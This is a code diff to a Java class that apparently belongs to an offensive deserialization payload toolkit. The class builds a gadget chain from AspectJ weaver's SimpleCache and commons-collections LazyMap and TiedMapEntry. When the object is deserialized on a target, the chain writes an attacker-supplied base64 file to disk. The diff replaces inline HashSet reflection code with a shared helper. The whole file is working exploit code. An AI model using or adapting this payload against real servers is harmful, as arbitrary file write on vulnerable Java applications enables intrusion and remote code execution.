@@ -11,10 +11,10 @@ import org.apache.commons.collections.map.LazyMap;
 
 import java.io.Serializable;
 import java.lang.reflect.Constructor;
-import java.lang.reflect.Field;
-import java.util.HashMap;
-import java.util.HashSet;
 import java.util.Map;
+
+import static com.qi4l.JYso.gadgets.AspectJWeaver2.getSerializableCC6;
+
 
 /**
  * Gadget chain:
@@ -37,10 +37,9 @@ import java.util.Map;
  * <a href="https://medium.com/nightst0rm/t%C3%B4i-%C4%91%C3%A3-chi%E1%BA%BFm-quy%E1%BB%81n-%C4%91i%E1%BB%81u-khi%E1%BB%83n-c%E1%BB%A7a-r%E1%BA%A5t-nhi%E1%BB%81u-trang-web-nh%C6%B0-th%E1%BA%BF-n%C3%A0o-61efdf4a03f5">...</a>
  */
 
-@SuppressWarnings({"rawtypes", "unchecked"})
+@SuppressWarnings("unused")
 @Dependencies({"org.aspectj:aspectjweaver:1.9.2", "commons-collections:commons-collections:3.2.2"})
 @Authors({Authors.JANG})
-
 public class AspectJWeaver implements ObjectPayload<Serializable> {
 
     public Serializable getObject(String command) throws Exception {
@@ -52,49 +51,14 @@ public class AspectJWeaver implements ObjectPayload<Serializable> {
         String[] parts = command.split(":");
         String filename = parts[0];
         byte[] content = Base64.decodeBase64(parts[1]);
-
         Constructor<?> ctor = Reflections.getFirstCtor("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap");
+
         Object simpleCache = ctor.newInstance(".", 12);
         Transformer ct = new ConstantTransformer(content);
-        Map lazyMap = LazyMap.decorate((Map) simpleCache, ct);
+
+        Map<?,?> lazyMap = LazyMap.decorate((Map<?,?>) simpleCache, ct);
         TiedMapEntry entry = new TiedMapEntry(lazyMap, filename);
-        HashSet map = new HashSet(1);
-        map.add("QI4L");
-        Field f;
-        try {
-            f = HashSet.class.getDeclaredField("map");
-        } catch (NoSuchFieldException e) {
-            f = HashSet.class.getDeclaredField("backingMap");
-        }
 
-        Reflections.setAccessible(f);
-        HashMap innimpl = (HashMap) f.get(map);
-
-        Field f2;
-        try {
-            f2 = HashMap.class.getDeclaredField("table");
-        } catch (NoSuchFieldException e) {
-            f2 = HashMap.class.getDeclaredField("elementData");
-        }
-
-        Reflections.setAccessible(f2);
-        Object[] array = (Object[]) f2.get(innimpl);
-
-        Object node = array[0];
-        if (node == null) {
-            node = array[1];
-        }
-
-        Field keyField;
-        try {
-            keyField = node.getClass().getDeclaredField("key");
-        } catch (Exception e) {
-            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
-        }
-
-        Reflections.setAccessible(keyField);
-        keyField.set(node, entry);
-
-        return map;
+        return getSerializableCC6(entry);
     }
 }
